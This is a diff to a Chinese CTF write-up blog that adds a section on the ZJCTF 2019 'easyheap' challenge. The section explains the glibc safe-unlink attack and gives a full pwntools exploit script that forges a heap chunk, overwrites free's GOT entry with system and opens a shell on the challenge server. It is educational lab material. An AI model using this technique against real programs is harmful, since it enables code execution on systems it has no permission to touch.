@@ -20,9 +20,9 @@ tags:
 
 [题目链接](https://buuoj.cn/challenges#babyheap_0ctf_2017)
 
-这是我第一个堆漏洞题目，详细记录一下。
+这是我第一个堆漏洞题目，详细记录一下，这个做法好像叫 **Fastbin 攻击**。
 
-**所有的内存地址都是死的、不动的，所谓“加入 Allocate 区”**都是形象化表述。
+**所有的内存地址都是不动的**，所谓“加入 Allocate 区”都是形象化表述。
 
 发现这个题有个菜单，显然的堆漏洞题目，但是它的 fill 没有检查 chunk 大小，所以显然可以堆溢出。
 
@@ -129,4 +129,139 @@ if __name__ == "__main__":
     main()
 ```
 
+### easyheap
 
+[题目链接](https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap)
+
+由于没做出来，所以面向结果写题解了，对不起。
+
+Safe Unlink 攻击。
+
+因为没有打印了，所以不太可能泄露 main_arena 了。
+
+由于 chunk 被释放时会检查前一个 chunk 是否被释放（即 size&1），若前一个 chunk 被释放就可能触发合并。
+
+合并有一个检查机制，即 unlink，**其作用是检查其链表完整性，同时把要被合并的 chunk_1 摘除**，其 C 伪代码如下：
+
+```
+/* * 宏定义：把 chunk P 从双向链表中摘除
+ * P：我们要摘除的 Chunk 的首地址
+ */
+#define unlink(P, BK, FD) {                                            
+    // 1. 拿到 P 的前向指针和后向指针
+    FD = P->fd;                                                          
+    BK = P->bk;                                                          
+    
+    // 2. Safe Unlink 检查
+    // 检查 FD 的 bk 是不是指回 P，检查 BK 的 fd 是不是指回 P
+    if (__builtin_expect (FD->bk != P || BK->fd != P, 0)) {              
+        malloc_printerr ("corrupted double-linked list");                
+    }                                                                    
+    
+    // 3. 安检通过后，执行真正的“摘除”操作
+    else {                                                               
+        FD->bk = BK;   // 让下一个块的 bk 指向上一个块
+        BK->fd = FD;   // 让上一个块的 fd 指向下一个块
+    }                                                                    
+}
+```
+
+假设存在三个 chunk：chunk_0 (使用中) -> chunk_1 (已释放) -> chunk_2 (使用中，即将被释放)。
+
+现在，执行 `free(chunk_2)`，由于 chunk_1 已释放，所以触发 unlink 机制。
+
+检查前一个的后一个是不是 P，后一个的前一个是不是 P（**注意这里 FD 和 BK 都指的是 unsortedbins 的其他 chunk，而不指物理相邻的 chunk_0 或 chunk_2**）
+
+如果完成了检查，接着摘除 chunk_1，假设在 unsortedbins 的 FD 指向 chunk_X，BK 指向 chunk_Y，那么发现最后 chunk_X 和 chunk_Y 成功链接，chunk_1 被解放了。
+
+随即 chunk_1 和 chunk_2 合并成为一个新的 chunk，进入 unsortedbins 写入新的 fd 和 bk。
+
+所以我们可以利用这一点，构造一个假 chunk，实现写入数据。
+
+这道题特点是没有开 PIE，而且存在一个全局变量 heaparray 存储了所有申请了的 chunk 的头指针。
+
+假设申请 chunk_0 和 chunk_1，当存在堆溢出漏洞时，可以覆盖 chunk_1 的 prev_size（构造假 chunk 想去哪去哪）和 size（消除 P 位触发合并）。
+
+在 chunk_0 中构造假 chunk，释放的 chunk 的构造如下：
+
+```
+INTERNAL_SIZE_T      mchunk_prev_size;
+INTERNAL_SIZE_T      mchunk_size;
+struct malloc_chunk* fd;
+struct malloc_chunk* bk;
+……
+```
+
+为了使检查通过，我们需要利用存储了 chunk_0 头指针的 heaparray[0]，因为 chunk 的构造，所以我们可以认为 fd = P + 0x10，bk = P + 0x18。
+
+既然它要检查 FD 的 bk，那么就让 FD = P - 0x18，同理 BK = P - 0x10。（令 P 为 heaparray[0]）
+
+检查通过后就会让 heaparray[0] 从存储一个堆的头指针到**存储 bss 段上的一个地址（heaparray - 0x18）**。
+
+此时此刻，我们再用 edit 修改 chunk_0 就直接在 heaparray - 0x18 处开始修改了，因此我们需要再填 0x18 个字节，再往 heaparray[0] 填上 free 的 got 表。
+
+此时此刻，我们再用 edit 修改 chunk_0 就直接修改 free 的 got 表了，所以我们直接填上 system。
+
+接着 free 一个带 binsh 的 chunk 就结束了。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'amd64',log_level = 'debug')
+
+host = "node5.buuoj.cn"
+port = 26750
+io = remote(host,port)
+# io = process("./easyheap")
+elf = ELF("./easyheap")
+ptr = 0x6020E0
+
+def create(size,content):
+    io.recvuntil(b"Your choice :")
+    io.sendline(b'1')
+    io.recvuntil(b"Size of Heap : ")
+    io.sendline(str(size))
+    io.recvuntil(b"Content of heap:")
+    io.sendline(content)
+
+def edit(index,content):
+    io.recvuntil(b"Your choice :")
+    io.sendline(b'2')
+    io.recvuntil(b"Index :")
+    io.sendline(str(index))
+    io.recvuntil(b"Size of Heap : ")
+    io.sendline(str(len(content)))
+    io.recvuntil(b"Content of heap : ")
+    io.sendline(content)
+
+def delete(index):
+    io.recvuntil(b"Your choice :")
+    io.sendline(b'3')
+    io.recvuntil(b"Index :")
+    io.sendline(str(index))
+
+def main():
+    create(0x80,b"this_is_index_0")  # index 0
+    create(0x80,b"this_is_index_1")  # index 1
+    create(0x80,b"/bin/sh\x00")      # index 2
+    fake_prev_size = p64(0)
+    fake_size = p64(0x81)
+    fake_fd = p64(ptr - 0x18)
+    fake_bk = p64(ptr - 0x10)
+    fake_chunk = fake_prev_size + fake_size + fake_fd + fake_bk
+    padding = b'A'*0x60
+    chunk_1_fake_prev_size = p64(0x80)
+    chunk_1_fake_size = p64(0x90)
+    payload_1 = fake_chunk + padding + chunk_1_fake_prev_size + chunk_1_fake_size
+    edit(0,payload_1)
+    delete(1)   # merge chunk_0 && chunk_1
+    payload_2 = p64(0)*3 + p64(elf.got['free'])
+    edit(0,payload_2)
+    system_addr = elf.plt['system']
+    edit(0,p64(system_addr))
+    delete(2)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
